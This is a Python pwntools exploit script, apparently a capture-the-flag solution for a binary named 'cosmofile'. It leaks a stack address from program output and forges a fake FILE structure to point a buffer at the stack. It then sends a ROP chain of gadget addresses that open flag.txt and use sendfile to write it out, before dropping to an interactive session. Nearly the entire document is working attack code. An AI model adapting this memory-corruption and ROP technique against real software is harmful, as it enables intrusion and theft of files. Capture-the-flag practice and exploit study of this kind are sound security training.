from pwn import *

exe = context.binary = ELF("./cosmofile")

gdbscript = '''
'''

pre_argv = []
post_argv = []


def get_conn(pre_argv, post_argv, gdbscript):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    cmd = pre_argv + [exe.path] + post_argv
    context.terminal = 'st'

    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(cmd)

    if args.GDB:
        gdb.attach(p)

    if args.DBG:
        p = gdb.debug(cmd, gdbscript=gdbscript)

    return p


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


p : tube = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: p.recv(*a, **k)
rl = lambda *a, **k: p.recvline(*a, **k)
ru = lambda *a, **k: p.recvuntil(*a, **k)
rr = lambda *a, **k: p.recvregex(*a, **k)
cl = lambda *a, **k: p.clean(*a, **k)
s = lambda *a, **k: p.send(*a, **k)
sa = lambda *a, **k: p.sendafter(*a, **k)
st = lambda *a, **k: p.sendthen(*a, **k)
sl = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
slt = lambda *a, **k: p.sendlinethen(*a, **k)
ia = lambda *a, **k: p.interactive(*a, **k)

ptr_protect = lambda pos, ptr: ptr ^ (pos >> 12)
ptr_mangle = lambda ptr, grd: rol(ptr ^ grd, 0x11)
ptr_demangle = lambda ptr, grd: ror(ptr, 0x11) ^ grd
i2b = lambda i: str(i).encode()


class FILE:
    def __init__(self):
        self.bufmode = 0
        self.freethis = 0
        self.freebuf = 0
        self.forking = 0
        self.oflags = 0
        self.state = 0
        self.fd = 0
        self.pid = 0
        self.size = 0
        self.beg = 0
        self.end = 0
        self.buf = 0

    def bytes(self):
        return flat(
            bytes([self.bufmode, self.freethis, self.freebuf, self.forking]),
            p32(self.oflags), p32(self.state), p32(self.fd), p32(self.pid), b"\x00" * 4,
            p32(self.size), p32(self.beg), p32(self.end), b"\x00" * 4,
            self.buf
        )


sla(b"> ", b"1")
ru(b"of cosmofile:\n")
res = r(0x1000)
while len(res) < 0x1000:
    res += r(0x1000 - len(res))
stack_leak = u64(res[2728:2736]) - 0xec8
log.success(f"Stack leak: {stack_leak:#x}")

fp = FILE()
fp.oflags = 2
fp.beg = fp.end = 0
fp.fd = 0
fp.size = 0x2000
fp.bufmode = 0
fp.buf = stack_leak

sla(b"> ", b"7238770")
sa(b"secret...\n", fp.bytes())

sla(b"> ", b"1")

syscall_ret = 0x4111fa
pop_rsi_rdi_rbp = 0x40401d
pop_rdx_rbx_rbp = 0x427748
pop_rax = 0x40bdf5
flagtxt = stack_leak + 0xe8
mov_r10_rcx_syscall = 0x41710e
pop_rcx_5_oth = 0x4035fe

payload = flat(
    b"A" * 0x1000,
    pop_rsi_rdi_rbp, 0, flagtxt, 0,
    pop_rdx_rbx_rbp, 0, 0, 0,
    pop_rax, 2,
    syscall_ret,
    pop_rsi_rdi_rbp, 4, 1, 0,
    pop_rdx_rbx_rbp, 0, 0, 0,
    pop_rcx_5_oth, 0x50, 0, 0, 0, 0, 0,
    pop_rax, 0x28,
    mov_r10_rcx_syscall,
    b"flag.txt\x00"
)

sa(b"cosmofile:\n", payload)

ia()